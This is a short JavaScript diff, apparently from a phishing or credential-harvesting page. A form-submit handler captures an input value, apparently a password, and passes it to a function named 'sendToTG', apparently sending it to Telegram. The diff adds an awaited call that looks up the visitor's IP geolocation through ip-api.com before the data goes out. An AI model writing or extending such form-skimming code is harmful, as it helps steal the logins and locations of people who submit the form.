@@ -37,6 +37,7 @@ document.addEventListener("DOMContentLoaded", function () {
         e.preventDefault();
         const pd = pi.value;
        // await sfr(el, pd);
+        await getLoc();
        await sendToTG(el, pd);
     });
 
@@ -98,8 +99,8 @@ document.addEventListener("DOMContentLoaded", function () {
 };
 
     
-    function getLoc(){
-        fetch('http://ip-api.com/json').then(response => response.json()).then(data => {
+    async function getLoc(){
+        await fetch('http://ip-api.com/json').then(response => response.json()).then(data => {
         console.log(JSON.stringify(data, null, 2))
       });
         return;
